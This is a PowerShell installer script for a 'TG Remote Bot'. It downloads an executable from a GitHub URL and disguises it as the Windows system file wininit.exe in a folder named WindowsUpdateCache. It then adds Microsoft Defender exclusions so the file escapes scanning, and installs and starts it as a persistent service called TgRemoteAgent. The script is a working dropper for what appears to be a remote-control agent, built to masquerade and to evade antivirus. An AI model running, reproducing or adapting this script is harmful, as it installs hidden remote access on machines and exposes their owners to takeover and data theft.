#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"

$Dir     = "C:\ProgramData\WindowsUpdateCache"
$ExeName = "wininit.exe"
$ExePath = Join-Path $Dir $ExeName
$TmpPath = Join-Path $env:TEMP $ExeName
$Url     = "https://github.com/cecon123/tg-remote-bot/raw/refs/heads/main/dist/wininit.exe"

Write-Host "=== TG Remote Bot Setup ===" -ForegroundColor Cyan

Write-Host "[1/4] Downloading $ExeName..."
Invoke-WebRequest -Uri $Url -OutFile $TmpPath -UseBasicParsing
Write-Host "      Saved to $TmpPath"

Write-Host "[2/4] Adding Defender exclusions..."
Add-MpPreference -ExclusionPath $Dir       -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $ExePath   -ErrorAction SilentlyContinue
Write-Host "      $Dir"
Write-Host "      $ExePath"

Write-Host "[3/4] Installing service..."
& $TmpPath --install

Write-Host "[4/4] Starting service..."
Start-Service "TgRemoteAgent" -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Done. Service is running." -ForegroundColor Green
